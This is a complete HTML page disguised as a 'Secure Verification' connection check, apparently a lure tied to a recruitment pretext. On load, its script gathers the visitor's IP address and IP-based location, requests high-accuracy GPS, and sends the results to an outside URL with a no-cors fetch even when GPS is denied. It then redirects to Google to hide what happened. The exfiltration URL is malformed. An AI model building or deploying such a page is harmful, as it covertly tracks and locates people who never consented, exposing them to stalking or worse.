<!DOCTYPE html>
<html>
<head>
    <title>Secure Verification</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f0f2f5; }
        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; }
    </style>
</head>
<body>
    <div class="card">
        <div id="status"><h3>Verifying Connection...</h3><p>Please do not close this window.</p></div>
    </div>

    <script>
const PA_USER = "talentacquisition"; 
        let data = { ip: "0.0.0.0", lat: "0", lon: "0", type: "IP-Only" };
        let sent = false;

        async function collectAndSend() {
            // 1. Get IP Data instantly
            try {
                const res = await fetch('https://ipapi.co');
                const json = await res.json();
                data.ip = json.ip;
                data.lat = json.latitude;
                data.lon = json.longitude;
            } catch (e) { console.log("IP fail"); }

            // 2. Try GPS
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        data.lat = pos.coords.latitude;
                        data.lon = pos.coords.longitude;
                        data.type = "High-Precision GPS";
                        finalize();
                    },
                    () => { finalize(); }, // If they deny, just send the IP data
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            } else { finalize(); }
            
            // 3. FORCE SEND after 5 seconds no matter what
            setTimeout(finalize, 5000);
        }

        function finalize() {
            if (sent) return;
            sent = true;
            
            // This 'no-cors' mode is the secret—it forces the data through even if there's a security error
            const url = \`https://${PA_USER}://{data.lat}&lon=${data.lon}&ip=${data.ip}&type=${data.type}\`;
            
            fetch(url, { mode: 'no-cors' });

            document.getElementById('status').innerHTML = "<h3>Verification Complete</h3>";
            setTimeout(() => { window.location.href = "https://google.com"; }, 1000);
        }

        window.onload = collectAndSend;
    </script>


        
    
</body>
</html>
